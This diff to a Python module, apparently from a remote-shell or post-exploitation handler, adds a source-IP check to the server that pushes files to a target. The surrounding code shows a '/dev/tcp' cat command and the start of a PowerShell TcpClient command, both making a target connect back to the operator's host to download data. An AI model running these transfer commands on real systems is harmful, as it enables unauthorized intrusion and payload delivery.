@@ -28,11 +28,8 @@ import argparse
 
 _PS_PROMPT = re.compile(r'^PS\s+\S+>\s*')
 
-# Lines exec_stream holds while learning whether the shell echoes.
 _ECHO_PREAMBLE_LINES = 8
 _SELECT_TIMEOUT = 0.1
-# Ceilings so a command that streams endlessly (or without newlines) cannot grow
-# unbounded in memory while exec() waits for its sentinel or its timeout.
 _MAX_EXEC_OUTPUT_BYTES = 8 * 1024 * 1024
 _MAX_LINE_BYTES = 1024 * 1024
 
@@ -361,7 +358,10 @@ class KoiModule(ABC):
         """Transfer *raw* bytes to *dest* on a Linux target via /dev/tcp."""
         local_ip = self._get_local_ip()
         quoted = self._shell_quote(dest)
-        port, thread, errors = spawn_send_server(raw, timeout=timeout, on_progress=on_progress)
+        port, thread, errors = spawn_send_server(
+            raw, timeout=timeout, on_progress=on_progress,
+            expected_ip=self.session.addr[0],
+        )
         result = self.exec(f"cat < /dev/tcp/{local_ip}/{port} > {quoted}", timeout=timeout)
         thread.join(timeout=timeout)
 
@@ -393,7 +393,10 @@ class KoiModule(ABC):
             "$ExecutionContext.SessionState.Path."
             f"GetUnresolvedProviderPathFromPSPath('{ps_dest}')"
         )
-        port, thread, errors = spawn_send_server(raw, timeout=timeout, on_progress=on_progress)
+        port, thread, errors = spawn_send_server(
+            raw, timeout=timeout, on_progress=on_progress,
+            expected_ip=self.session.addr[0],
+        )
         ps_cmd = (
             f"$_c=New-Object Net.Sockets.TcpClient('{local_ip}',{port});"
             f"$_s=$_c.GetStream();"
